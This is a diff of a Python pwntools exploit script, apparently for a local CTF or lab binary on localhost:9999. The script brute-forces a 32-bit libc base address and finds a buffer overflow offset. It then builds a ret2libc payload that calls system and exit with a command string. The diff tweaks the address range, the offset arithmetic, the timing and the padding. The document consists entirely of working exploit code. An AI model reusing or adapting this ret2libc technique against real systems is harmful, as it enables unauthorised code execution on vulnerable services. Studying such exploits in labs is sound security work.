@@ -6,7 +6,7 @@ from pwn import *
 HOST = "localhost"
 PORT = 9999
 
-def generar_direcciones_libc(base_start=0xf7cc0000, base_end=0xf7ec0000, page_size=0x1000):
+def generar_direcciones_libc(base_start= 0xf7f00000 , base_end=0xf7000000, page_size=-0x1000):
     return [addr for addr in range(base_start, base_end, page_size)]
     
 def send_payload(payload_data):
@@ -48,9 +48,9 @@ def calcular_offset():
         RESPONSE = send_payload(PAYLOAD)
         if not RESPONSE:
             print(f"[+] GOT IT: offset = {i}")
-            return i-2
+            return i-1
             break
-        time.sleep(0.5)
+        time.sleep(0.1)
         i += 1
     
     return 
@@ -75,7 +75,7 @@ for base in libc_base_guesses:
     exit_addr = struct.pack("<I",(base + exit_offset))      # 0xf7e04ec0)
     command  = struct.pack("<I", (base + command_offset))   # 0xf7e12360)
 
-    PAYLOAD = b"A" * offset + b"B"
+    PAYLOAD = b"A" * offset
     PAYLOAD += system
     PAYLOAD += exit_addr
     PAYLOAD += command
